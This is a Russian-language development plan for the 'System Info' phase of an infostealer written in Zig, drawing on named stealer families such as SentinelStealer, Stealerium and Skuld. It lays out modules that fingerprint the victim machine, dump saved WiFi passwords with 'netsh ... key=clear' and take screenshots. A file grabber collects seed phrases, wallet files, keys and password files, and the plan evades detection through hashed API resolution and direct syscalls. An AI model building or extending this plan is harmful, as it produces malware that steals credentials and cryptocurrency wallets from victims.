# Phase 4.7: System Info — План реализации

## Источники кода

| Модуль | Источники | Ключевые техники |
|--------|-----------|-----------------|
| **OS Info** | Phantom/SentinelStealer | Registry `HKLM\...\Windows NT\CurrentVersion` |
| **Hardware** | Phantom/Stealerium | WMI Win32_Processor/VideoController + syscalls |
| **Network** | Ferrox recon.rs, Skuld system.go | ipconfig, netsh, registry, HTTP API |
| **WiFi** | Phantom/Stealerium/Stealerium Wifi.cs | netsh wlan show profiles |
| **Screenshot** | Phantom/SentinelStealer | GDI BitBlt via gdi32.dll |
| **File Grabber** | SentinelStealer FileGrabber.cs | NtQueryDirectoryFile + extension masks |
| **System Info** | Phantom SysInfo.cs | Consolidated report builder |

## Файлы к реализации

### `os_info.zig` — OS Version/Build
```
1. NtOpenKey → HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
2. NtQueryValueKey → ProductName, CurrentBuild, DisplayVersion, ReleaseId, EditionID
3. Format: "Windows 11 Pro 23H2 (build 22631)"
```

### `hardware.zig` — CPU, GPU, RAM
```
1. CPU: NtQuerySystemInformation(SystemBasicInformation) — уже есть
2. GPU: NtOpenKey → HKLM\HARDWARE\DEVICEMAP\VIDEO → Device Description
3. RAM: NtQuerySystemInformation(SystemBasicInformation) — уже есть
4. Disks: NtQueryVolumeInformationFile → total/free space
```

### `network_info.zig` — Hostname, IP, MAC
```
1. Hostname: GetComputerNameEx через kernel32 (DJB2 resolved)
2. Local IP: GetAdaptersInfo через iphlpapi.dll ИЛИ ipconfig
3. MAC: GetAdaptersInfo → PhysicalAddress для активного адаптера
4. Public IP: HTTP GET к ip-api.com/json/ (через winhttp.dll или raw socket)
```

### `wifi.zig` — WiFi Profiles
```
1. CreateProcess(netsh wlan show profiles) → Read stdout
2. Для каждого профиля: CreateProcess(netsh wlan show profile name="X" key=clear)
3. Парсинг "Key Content" → пароль
4. Формат: "SSID:password\n"
```

### `screenshot.zig` — Screenshot
```
1. Load gdi32.dll через LdrLoadDll
2. Resolve: CreateDCW, CreateCompatibleDC, CreateCompatibleBitmap, SelectObject, BitBlt, DeleteDC
3. Virtual Screen: GetSystemMetrics(SM_XVIRTUALSCREEN + SM_CXVIRTUALSCREEN + SM_CYVIRTUALSCREEN)
4. Save as BMP → return bytes
```

### `grabber.zig` — File Grabber
```
1. Маски: *.txt, *seed*, *.dat, *.wallet, *backup*, *.key, *password*
2. Директории: Desktop, Documents, Downloads
3. NtQueryDirectoryFile для обхода
4. Макс размер: 5MB, макс глубина: 3
```

### `system_info.zig` — Master Collector
```
pub fn collect(allocator) ![]u8 {
    // 1. OS info
    // 2. Hardware (CPU, GPU, RAM, disks)
    // 3. Network (hostname, IP, MAC)
    // 4. WiFi
    // 5. Screenshot
    // 6. File grabber
    // 7. Format as text report
}
```

## Зависимости

| Модуль | Зависит от | Новые сисколлы |
|--------|-----------|----------------|
| os_info.zig | engine (NtOpenKey, NtQueryValueKey) | — |
| hardware.zig | engine (NtQuerySystemInformation, NtOpenKey) | NtQueryVolumeInformationFile |
| network_info.zig | dll_loader, kernel32, iphlpapi | — |
| wifi.zig | Создание процесса (CreateProcess) | — |
| screenshot.zig | dll_loader, gdi32 | — |
| grabber.zig | engine (NtQueryDirectoryFile) | NtQueryDirectoryFile |
| system_info.zig | Все выше | — |
